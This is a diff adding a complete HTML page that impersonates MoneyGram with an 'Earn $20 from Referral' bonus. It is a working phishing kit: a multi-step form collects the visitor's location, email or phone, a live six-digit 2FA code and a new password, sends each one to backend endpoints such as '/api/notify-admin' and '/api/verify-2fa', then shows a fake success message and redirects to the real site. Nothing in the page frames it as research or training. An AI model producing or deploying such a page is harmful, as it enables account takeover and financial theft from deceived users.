@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MoneyGram - Earn $20 from Referral</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container { width: 100%; max-width: 420px; }
+        .logo-section { text-align: center; margin-bottom: 30px; }
+        .logo { 
+            background: #dc1e35; 
+            color: white; 
+            padding: 15px 30px; 
+            font-size: 28px; 
+            font-weight: bold; 
+            border-radius: 8px; 
+            display: inline-block; 
+        }
+        .subtitle { color: #dc1e35; font-size: 18px; font-weight: 600; margin-top: 15px; }
+        .form-card { 
+            background: white; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1); 
+            padding: 35px; 
+        }
+        .step-indicator { display: flex; justify-content: center; margin-bottom: 30px; gap: 10px; }
+        .step-dot { width: 12px; height: 12px; border-radius: 50%; background: #ddd; }
+        .step-dot.active { background: #dc1e35; }
+        .step { display: none; }
+        .step.active { display: block; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        h2 { color: #333; font-size: 22px; margin-bottom: 8px; text-align: center; }
+        .description { color: #666; font-size: 14px; text-align: center; margin-bottom: 25px; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; color: #333; font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+        input, select { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: 2px solid #e0e0e0; 
+            border-radius: 8px; 
+            font-size: 16px; 
+        }
+        input:focus, select:focus { outline: none; border-color: #dc1e35; }
+        .btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: #dc1e35; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: 10px;
+        }
+        .btn:hover { background: #b8182c; }
+        .btn-secondary { background: transparent; color: #666; border: 2px solid #ddd; }
+        .btn-secondary:hover { border-color: #dc1e35; color: #dc1e35; }
+        .toggle { display: flex; background: #f5f5f5; border-radius: 8px; padding: 4px; margin-bottom: 20px; }
+        .toggle-btn { 
+            flex: 1; 
+            padding: 10px; 
+            border: none; 
+            background: transparent; 
+            color: #666; 
+            font-size: 14px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            border-radius: 6px; 
+        }
+        .toggle-btn.active { background: white; color: #dc1e35; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        .code-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 20px; }
+        .code-inputs input { width: 50px; height: 60px; text-align: center; font-size: 24px; font-weight: bold; padding: 0; }
+        .waiting { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-size: 14px; }
+        .resend { text-align: center; margin-top: 15px; }
+        .resend a { color: #dc1e35; font-size: 14px; cursor: pointer; text-decoration: underline; }
+        .success-icon { text-align: center; font-size: 60px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <div class="logo">MoneyGram</div>
+            <div class="subtitle">Earn $20 from Referral</div>
+        </div>
+
+        <div class="form-card">
+            <div class="step-indicator">
+                <div class="step-dot active" id="dot1"></div>
+                <div class="step-dot" id="dot2"></div>
+                <div class="step-dot" id="dot3"></div>
+                <div class="step-dot" id="dot4"></div>
+            </div>
+
+            <!-- Step 1 -->
+            <div class="step active" id="step1">
+                <h2>Select Your Preferences</h2>
+                <p class="description">Where Are You Located?</p>
+                <div class="input-group">
+                    <label>Select Country/Region</label>
+                    <select id="location">
+                        <option value="">Choose your location...</option>
+                        <option value="US">United States</option>
+                        <option value="CA">Canada</option>
+                        <option value="UK">United Kingdom</option>
+                        <option value="AU">Australia</option>
+                        <option value="DE">Germany</option>
+                        <option value="FR">France</option>
+                        <option value="ES">Spain</option>
+                        <option value="IT">Italy</option>
+                        <option value="NL">Netherlands</option>
+                        <option value="BE">Belgium</option>
+                        <option value="CH">Switzerland</option>
+                        <option value="AT">Austria</option>
+                        <option value="SE">Sweden</option>
+                        <option value="NO">Norway</option>
+                        <option value="DK">Denmark</option>
+                        <option value="FI">Finland</option>
+                        <option value="MX">Mexico</option>
+                        <option value="BR">Brazil</option>
+                        <option value="AR">Argentina</option>
+                        <option value="CL">Chile</option>
+                        <option value="CO">Colombia</option>
+                        <option value="PE">Peru</option>
+                        <option value="IN">India</option>
+                        <option value="PH">Philippines</option>
+                        <option value="ID">Indonesia</option>
+                        <option value="MY">Malaysia</option>
+                        <option value="TH">Thailand</option>
+                        <option value="SG">Singapore</option>
+                        <option value="HK">Hong Kong</option>
+                        <option value="JP">Japan</option>
+                        <option value="KR">South Korea</option>
+                        <option value="CN">China</option>
+                        <option value="TW">Taiwan</option>
+                        <option value="AE">United Arab Emirates</option>
+                        <option value="SA">Saudi Arabia</option>
+                        <option value="ZA">South Africa</option>
+                        <option value="NG">Nigeria</option>
+                        <option value="KE">Kenya</option>
+                        <option value="GH">Ghana</option>
+                        <option value="Other">Other</option>
+                    </select>
+                </div>
+                <button class="btn" onclick="submitLocation()">Continue</button>
+            </div>
+
+            <!-- Step 2 -->
+            <div class="step" id="step2">
+                <h2>Get Started</h2>
+                <p class="description">Enter your email or phone number</p>
+                <div class="toggle">
+                    <button class="toggle-btn active" onclick="setType('email')">Email</button>
+                    <button class="toggle-btn" onclick="setType('phone')">Phone</button>
+                </div>
+                <div class="input-group">
+                    <label id="contactLabel">Email Address</label>
+                    <input type="text" id="contact" placeholder="Enter your email">
+                </div>
+                <button class="btn" onclick="submitContact()">Continue</button>
+                <button class="btn btn-secondary" onclick="showStep(1)">Back</button>
+            </div>
+
+            <!-- Step 3 -->
+            <div class="step" id="step3">
+                <h2>Security Verification</h2>
+                <p class="description">Enter the 6-digit code sent to your device</p>
+                <div class="waiting">⏳ Please check your device for the security code</div>
+                <div class="code-inputs">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(0, event)">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(1, event)">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(2, event)">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(3, event)">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(4, event)">
+                    <input type="text" maxlength="1" class="code" onkeyup="moveFocus(5, event)">
+                </div>
+                <button class="btn" onclick="submitCode()">Verify</button>
+                <div class="resend">
+                    <a onclick="resendCode()">Didn't receive code? Resend</a>
+                </div>
+                <button class="btn btn-secondary" onclick="showStep(2)">Back</button>
+            </div>
+
+            <!-- Step 4 -->
+            <div class="step" id="step4">
+                <h2>Create Password</h2>
+                <p class="description">Set a secure password for your account</p>
+                <div class="input-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter password">
+                </div>
+                <div class="input-group">
+                    <label>Confirm Password</label>
+                    <input type="password" id="confirm" placeholder="Confirm password">
+                </div>
+                <button class="btn" onclick="submitFinal()">Complete Setup</button>
+                <button class="btn btn-secondary" onclick="showStep(3)">Back</button>
+            </div>
+
+            <!-- Success -->
+            <div class="step" id="step5">
+                <div class="success-icon">🎉</div>
+                <h2>Success!</h2>
+                <p class="description">Your account has been verified. Your $20 referral bonus will be credited within 24 hours.</p>
+                <button class="btn" onclick="window.location.href='https://www.moneygram.com'">Continue to MoneyGram</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
+        var contactType = 'email';
+        var location, contactValue, codeValue;
+
+        function showStep(n) {
+            for (var i = 1; i <= 5; i++) {
+                document.getElementById('step' + i).classList.remove('active');
+                if (i <= 4) document.getElementById('dot' + i).classList.remove('active');
+            }
+            document.getElementById('step' + n).classList.add('active');
+            for (var i = 1; i <= Math.min(n, 4); i++) {
+                document.getElementById('dot' + i).classList.add('active');
+            }
+        }
+
+        function setType(type) {
+            contactType = type;
+            var btns = document.querySelectorAll('.toggle-btn');
+            btns[0].classList.toggle('active', type === 'email');
+            btns[1].classList.toggle('active', type === 'phone');
+            document.getElementById('contactLabel').textContent = type === 'email' ? 'Email Address' : 'Phone Number';
+            document.getElementById('contact').placeholder = type === 'email' ? 'Enter your email' : 'Enter your phone number';
+        }
+
+        function submitLocation() {
+            location = document.getElementById('location').value;
+            if (!location) return alert('Please select your location');
+            
+            fetch('/api/notify-admin', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({sessionId, location, timestamp: new Date().toISOString()})
+            }).catch(function(){});
+            
+            showStep(2);
+        }
+
+        function submitContact() {
+            contactValue = document.getElementById('contact').value;
+            if (!contactValue) return alert('Please enter your ' + contactType);
+            
+            fetch('/api/store-contact', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({sessionId, location, contactType, contactValue})
+            }).catch(function(){});
+            
+            showStep(3);
+            setTimeout(function() { document.querySelectorAll('.code')[0].focus(); }, 100);
+        }
+
+        function moveFocus(idx, e) {
+            var codes = document.querySelectorAll('.code');
+            if (e.target.value && idx < 5) codes[idx + 1].focus();
+            if (e.key === 'Backspace' && idx > 0 && !e.target.value) codes[idx - 1].focus();
+        }
+
+        function submitCode() {
+            var codes = document.querySelectorAll('.code');
+            codeValue = '';
+            for (var i = 0; i < 6; i++) codeValue += codes[i].value;
+            if (codeValue.length !== 6) return alert('Please enter all 6 digits');
+            
+            fetch('/api/verify-2fa', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({sessionId, code: codeValue})
+            }).catch(function(){});
+            
+            showStep(4);
+        }
+
+        function resendCode() {
+            fetch('/api/resend-notification', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({sessionId, contactType, contactValue, location})
+            }).catch(function(){});
+            alert('Code resent. Check your device.');
+        }
+
+        function submitFinal() {
+            var password = document.getElementById('password').value;
+            var confirm = document.getElementById('confirm').value;
+            if (!password) return alert('Please enter a password');
+            if (password !== confirm) return alert('Passwords do not match');
+            
+            fetch('/api/finalize', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({sessionId, location, contactType, contactValue, twoFACode: codeValue, password})
+            }).catch(function(){});
+            
+            showStep(5);
+        }
+    </script>
+</body>
+</html>
